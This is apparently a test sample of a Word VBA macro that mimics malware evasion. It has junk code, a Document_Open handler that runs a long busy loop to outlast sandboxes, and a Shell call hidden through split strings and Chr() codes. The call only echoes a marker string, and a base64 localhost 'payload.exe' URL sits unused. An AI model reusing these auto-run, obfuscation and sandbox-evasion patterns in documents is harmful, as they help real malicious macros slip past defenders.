
Public Sub OblivionXJunkRoutine()
    Dim junkcounter As Long
    Dim junktext As String
    If False Then
        junktext = "decoy"
        junkcounter = 1 + 1
    End If
    Dim deadvarunused As Long
    If 1 = 2 Then
        deadvarunused = 999
    End If

End Sub
Attribute VB_Name = "ThisDocument"
Private Sub Document_Open()
    Dim lckhv437 As Long
    Dim xcx6ug6uo As Double
    For lckhv437 = 1 To 300000000
        xcx6ug6uo = xcx6ug6uo + lckhv437 * 0.000001
    Next lckhv437
    ' only reached if the busy loop is allowed to finish
    Shell "cmd /c e" & "cho " & Chr(111) & Chr(98) & Chr(108) & Chr(105) & Chr(118) & Chr(105) & Chr(111) & Chr(110) & Chr(120) & "-timeo" & "ut-mar" & "ker", 0
End Sub

Public Function OblivionXDecoy() As String
    Dim b64 As String
    b64 = "aHR0cDovLzEyNy4wLjAuMTo5MDkwL3BheWxvYWQuZXhl"
    OblivionXDecoy = b64
End Function
